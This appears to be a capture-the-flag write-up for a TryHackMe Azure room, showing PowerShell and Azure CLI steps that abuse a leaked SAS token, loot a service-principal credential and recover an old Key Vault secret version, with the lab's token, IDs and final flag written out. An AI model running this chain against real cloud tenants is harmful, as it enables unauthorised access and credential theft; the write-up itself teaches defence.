| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Day** | 9 |
| **Room** | CryptoCabana |
| **Category** | Cloud / Azure Storage SAS leak → Key Vault secret versioning |
| **Flag format** | `THM{...}` |

---

## Objective

**CryptoCabana** is a Medium-rated (90 pts) Azure cloud challenge built around a seed-phrase backup kiosk hosted as an **Azure Storage static website**. The whole chain starts with one bad decision: an over-privileged **account SAS token hardcoded in client-side JavaScript**. The kiosk only ever uses that token to `PUT` a backup, but it was minted with account-wide **read + list** power (`ss=b&srt=sco&sp=rl`) that never expires. That list/read reach exposes an unlinked `vault` container holding a **service-principal credential file**, which unlocks an Azure **Key Vault** whose flag is split across three secret shards — and the real middle shard only survives in Key Vault's **secret version history** after a fake "rotation".

By the end of this room you will be able to:

- Read a kiosk's **client-side `app.js`** and recognise a hardcoded, over-privileged **account SAS token**
- Decode SAS parameters (`ss`, `srt`, `sp`, `se`) and reason about what a token can actually do versus what the app uses it for
- Use a `list`-capable SAS to enumerate **blob containers** and surface an **unlinked container** used for security-through-obscurity
- Loot a leaked **service-principal** credential file (`client_id` / `client_secret` / `tenant_id`) from a readable blob
- Authenticate to Azure as the leaked SP with `az login --service-principal` and enumerate a **Key Vault**
- Recover a "rotated" secret from **Key Vault secret version history** with `az keyvault secret list-versions` and `--version`
- Reassemble a flag split across multiple secret shards

> **Authorisation warning:** The techniques below — enumerating storage with a leaked SAS, looting credentials, and reading Key Vault secret versions — must only ever be run against systems you have **explicit authorization** to test, here the TryHackMe lab. Running them against cloud tenants you do not own or control is illegal.

---

## Story Hook

The briefing hides the whole kill chain in plain language: _"He'd backed his seed phrase up... into the CryptoCabana kiosk's vault — the one whose landing page promised, in exactly four words, 'Backed up. Sleep easy.'"_ The itinerary then points three times: _"pull apart what the kiosk hands out for free before you've even clicked anything"_ (client-side JS), _"follow that trust somewhere the kiosk's own page never once points you"_ (an unlinked container), and _"a second, more valuable set of keys — and a vault that won't give up the real values on the first ask"_ (Key Vault + versioning).

@0xMia's tip seals it: _"if a value looks freshly rotated, ask yourself what it looked like five minutes before that"_ — a direct nudge toward **Key Vault secret version history**.

---

## Attack Path

| **1** | **Itinerary #1 — read the free handout (client JS)**<br>`view-source` on the kiosk exposes `app.js`, which hardcodes `STORAGE_ACCOUNT`, `BACKUPS_CONTAINER`, and a long-lived `BACKUP_SAS`. Decoding the SAS: `ss=b` (blob), `srt=sco` (service/container/object), `sp=rl` (**read + list**), `se=2099-12-31` (never expires). The page only ever does a `PUT`, but the token can **list and read the entire account**. |
| --- | --- |

| **2** | **Itinerary #2 — follow the trust off-page (list containers)**<br>Use the SAS's service-level list to enumerate containers → `$web`, `backups`, and **`vault`** (the last never referenced anywhere on the site). |
| --- | --- |

| **3** | **Read the `vault` container**<br>List blobs → `backup-service-account.json` and `seed_phrase.txt`. The txt holds a **decoy** 12-word phrase (`velvet cabana rebuild scatter...`). The JSON leaks a **service principal** (`client_id` / `client_secret` / `tenant_id`) plus `key_vault_name: ccabana-kv-f5scjagc` — with an IT note: _"Rotate this if it ever leaves the vault."_ |
| --- | --- |

| **4** | **Itinerary #3 — into the Key Vault**<br>Log in as the leaked SP (`az login --service-principal`) and list secrets → `key-shard-1/2/3` (readable) and `master-key` (access denied, expired 2020). The flag is split across the three shards. |
| --- | --- |

| **5** | **The versioning twist**<br>`key-shard-1` = `THM{n0t_ur`, `key-shard-3` = `ur_c01ns!}`, but `key-shard-2`'s current value is a **decoy note**. `az keyvault secret list-versions` on `key-shard-2` → two versions seconds apart; the **older version** (`3d6492d2...`) holds the real middle piece: `_k3ys_n0t_`. |
| --- | --- |

| **6** | **Assemble**<br>Concatenate shard-1 + shard-2 (old version) + shard-3 to spell the full flag. |
| --- | --- |

---

## Walkthrough

The whole engagement runs from a single **PowerShell + Azure CLI** session — the SAS lifted from the kiosk drives the storage enumeration, then the leaked service principal drives the Key Vault reads.

### 1. Setup — the SAS lifted straight from the kiosk's `app.js`

The kiosk's client-side JavaScript hands you the storage account name and a long-lived account SAS. Store both in variables:

```powershell
# --- Setup: the SAS lifted straight from the kiosk's app.js ---
PS C:\> $acct = "cryptocabanaf5scjagc"
PS C:\> $sas  = 'sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D'
```

### 2. List all containers → find the unlinked `vault`

The SAS carries service-level `list` (`srt=sco`, `sp=rl`), so a `comp=list` request enumerates every container — including one the site never links to:

```powershell
# 1) List ALL containers (service-level list) -> reveals the unlinked 'vault'
PS C:\> $raw = Invoke-WebRequest "https://$acct.blob.core.windows.net/?comp=list&$sas"
PS C:\> ([xml]$raw.Content).EnumerationResults.Containers.Container.Name   # $web, backups, vault
```

### 3. List blobs in `vault`

Point the same SAS at the `vault` container and list its blobs:

```powershell
# 2) List blobs in 'vault'
PS C:\> $raw = Invoke-WebRequest "https://$acct.blob.core.windows.net/vault`?restype=container&comp=list&$sas"
PS C:\> ([xml]$raw.Content).EnumerationResults.Blobs.Blob.Name            # backup-service-account.json, seed_phrase.txt
```

### 4. Read the loot

Read both blobs. `seed_phrase.txt` is a decoy; `backup-service-account.json` leaks the service-principal credentials and the target Key Vault name:

```powershell
# 3) Read the loot
PS C:\> Invoke-RestMethod "https://$acct.blob.core.windows.net/vault/backup-service-account.json`?$sas"  # SP creds + key_vault_name
PS C:\> Invoke-RestMethod "https://$acct.blob.core.windows.net/vault/seed_phrase.txt`?$sas"             # decoy phrase
```

### 5. Authenticate as the leaked service principal

Log in to Azure as the leaked SP using its `client_id` (username), `client_secret` (password), and `tenant_id`:

```powershell
# 4) Authenticate as the leaked service principal
PS C:\> az login --service-principal `
  --username "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" `
  --password "<client_secret>" `
  --tenant   "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
```

### 6. Read the shard secrets

List the vault's secrets, then read the two readable end shards directly:

```powershell
# 5) Read the shard secrets
PS C:\> $vault = "ccabana-kv-f5scjagc"
PS C:\> az keyvault secret list --vault-name $vault -o table
PS C:\> az keyvault secret show --vault-name $vault --name key-shard-1 --query value -o tsv   # THM{n0t_ur
PS C:\> az keyvault secret show --vault-name $vault --name key-shard-3 --query value -o tsv   # ur_c01ns!}
```

### 7. key-shard-2 is a decoy → pull the previous version

`key-shard-2`'s current value is a decoy note left after IT "rotated" it. List the secret's versions and read the **older** one by its version id to recover the real middle piece:

```powershell
# 6) key-shard-2 is a decoy -> pull the PREVIOUS version
PS C:\> az keyvault secret list-versions --vault-name $vault --name key-shard-2 `
  --query "sort_by([], &attributes.created)[].{ver:id, created:attributes.created}" -o table
PS C:\> az keyvault secret show --vault-name $vault --name key-shard-2 `
  --version "3d6492d2c6f74123bc754a9ded22b2a0" --query value -o tsv
      # _k3ys_n0t_
```

---

## Flag

> **🚩 Flag**
>
> `THM{n0t_ur_k3ys_n0t_ur_c01ns!}`
>
> Assembled from `THM{n0t_ur` (key-shard-1) + `_k3ys_n0t_` (key-shard-2, old version) + `ur_c01ns!}` (key-shard-3) — it spells out the crypto adage "**not your keys, not your coins**."

### Key facts

| Item | Value |
|---|---|
| Kiosk (static site) | `https://cryptocabanaf5scjagc.z13.web.core.windows.net/` |
| Storage account | `cryptocabanaf5scjagc` |
| Leak location | `app.js` (client-side) — hardcoded account SAS |
| SAS scope | `ss=b srt=sco sp=rl se=2099-12-31` (read+list, account-wide, never expires) |
| Containers | `$web`, `backups`, **`vault`** (unlinked) |
| Loot blobs | `vault/backup-service-account.json` (SP creds), `vault/seed_phrase.txt` (decoy) |
| Service principal | `dbcf2923-e4eb-4b72-a0a4-688aa1185cf5` (tenant `8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c`) |
| Key Vault | `ccabana-kv-f5scjagc` |
| Secrets | `key-shard-1/2/3` (readable), `master-key` (denied) |
| The twist | `key-shard-2` current = decoy; **older version** `3d6492d2...` = real value |
| Flag pieces | `THM{n0t_ur` + `_k3ys_n0t_` (old ver) + `ur_c01ns!}` |

---

## Key Takeaways

- **Never ship SAS tokens (or any credential) in client-side JavaScript** — anything the browser can read, an attacker can read.
- **Least privilege on SAS:** this token only needed **write** to one container, but was minted with account-wide **read + list** (`srt=sco`, `sp=rl`) and a **2099 expiry**. Scope tokens to the exact container, permission, and a short lifetime; prefer user-delegation SAS or a stored access policy that can be revoked.
- **Don't store service-principal secrets in a readable blob** — the `vault` container turned one leaked SAS into full Key Vault access.
- **"Rotating" a leaked Key Vault secret does not erase it** — old versions persist in version history and are readable with `secret/get` unless explicitly disabled/destroyed. After a leak, **disable/destroy prior versions** (or purge), not just add a new one.
- **Don't rely on unlinked/unlisted resources for secrecy** (security through obscurity) — the `vault` container wasn't referenced anywhere, but `list` permission surfaced it instantly.

---

## Final Takeaway

CryptoCabana shows how one **over-privileged SAS token** in client-side code cascades into a full cloud compromise. The kiosk's `app.js` hands out an account **SAS** scoped `ss=b&srt=sco&sp=rl` with a 2099 expiry — **read + list** across the whole blob service, when the app only ever needed to **write** one backup. That surplus power exposes an **unlinked container** (`vault`) that security-through-obscurity assumed no one would find, and inside it a readable blob leaks a **service principal** whose credentials unlock an Azure **Key Vault**. The final twist is the sharpest lesson: the middle flag shard was "rotated" to a decoy, but **Key Vault secret versioning** retains the old value, so `list-versions` plus a version id recovers `_k3ys_n0t_` and completes `THM{n0t_ur_k3ys_n0t_ur_c01ns!}`. Scope tokens to the **least privilege** they need, keep credentials out of blobs and browsers, and remember that rotating a leaked secret without **disabling old versions** leaves it fully recoverable.

---
*Adapted from the [Hacker Holidays 2026 findings log](https://github.com/Varun-Patkar/HackerHolidays) by Varun Anand Patkar (MIT License).*
